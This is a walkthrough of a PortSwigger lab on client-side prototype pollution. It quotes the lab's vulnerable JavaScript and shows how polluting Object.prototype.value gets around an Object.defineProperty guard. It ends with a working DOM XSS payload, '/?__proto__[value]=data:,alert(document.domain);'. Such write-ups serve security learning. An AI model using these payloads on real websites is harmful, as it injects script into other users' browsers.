# Client-side prototype pollution via browser APIs

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis), you'll learn: Client-side prototype pollution via browser APIs! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) via client-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution). The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`. 
2. Identify a gadget property that allows you to execute arbitrary JavaScript. 
3. Combine these to call `alert()`. 

You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).

## Exploitation

### Find a source that you can use to add arbitrary properties to the global `Object.prototype`

**To find a source (Inputs that are under attacker's control), we can do it manually:**

1. Try to inject an arbitrary property via the query string, URL fragment, and any web message data. For example:
```js
vulnerable-website.com/?__proto__[foo]=bar
```

2. In the browser console, inspect the `Object.prototype` to see if we have successfully polluted it with our arbitrary property:
```js
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
   
3. If the property was not added to the global prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
```js
vulnerable-website.com/?__proto__.foo=bar
```

4. Repeat this process for each potential source.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122160132.png)

In here, we see there is a search box.

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122160212.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122160220.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122160301.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122160324.png)

When we clicked the "Search" button, it'll send a GET request to `/` with parameter `search` and our input value. **Also, it'll send a POST request to `/logger` with parameter `search`, `constructor.prototype.b1a3fd5b`, and `__proto__.ccd80966`.**

**View source page:**
```html
<script src='resources/js/deparam.js'></script>
<script src='resources/js/searchLoggerConfigurable.js'></script>
```

In here, we see there are 2 JavaScript files are loaded.

**`deparam.js`:**
```js
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );
            keys = keys.shift().split('[').concat( keys );
            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[key].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[key] = [ obj[key], val ];
                } else {
                    obj[key] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```

**`searchLoggerConfigurable.js`:**
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

In the `searchLoggerConfigurable.js`, we can see that **it's using `fetch()` API to send a POST request to `/logger`, with object `config`'s `params` attribute.**

**We also see that the function `searchLogger()` is using the `Object.defineProperty()` method:**
```js
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
```

This enables developer to set a non-configurable, non-writable property directly on the affected object. Basically it prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain.

However, we can bypass that mitigation.

In method `Object.defineProperty()`, **it accepts an options object, known as a "descriptor".** Developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.

In this case, an attacker may be able to bypass this defense by polluting the `Object.prototype` with a malicious `value` property. If this is inherited by the descriptor object passed to `Object.defineProperty()`, the attacker-controlled value may be assigned to the gadget property after all.

Hence, the method `Object.defineProperty()` is the source (Attacker's controlled input) that we can use to add arbitrary properties to the global `Object.prototype`.

**Hence, our payload would be:**
```js
/?__proto__[value]=foo
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122161312.png)

We successfully added an arbitrary properties to the global `Object.prototype`!

### Identify a gadget property that allows you to execute arbitrary JavaScript

**In the `searchLoggerConfigurable.js`, we see this:**
```js
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```

The **object `config`'s attribute `transport_url` is being parsed to an `<script>` element's `src` attribute!** This is the sink (Dangerous function). However, the method `Object.defineProperty()` has set the attribute `transport_url` to non-writable, which is not exploitable.

Luckly, since we can add an arbitrary value to method `Object.defineProperty()`, we can still trigger an DOM-based XSS!

### Combine these to call `alert()`

**Now, we can use the `value` attribute in descriptor object in method `Object.defineProperty()` to write an arbitrary `src` value:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122162334.png)

**Armed with above information, we can craft a payload that'll trigger an DOM-based XSS:**
```js
/?__proto__[value]=data:,alert(document.domain);
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122162452.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-4/images/Pasted%20image%2020230122162502.png)

# What we've learned:

1. Client-side prototype pollution via browser APIs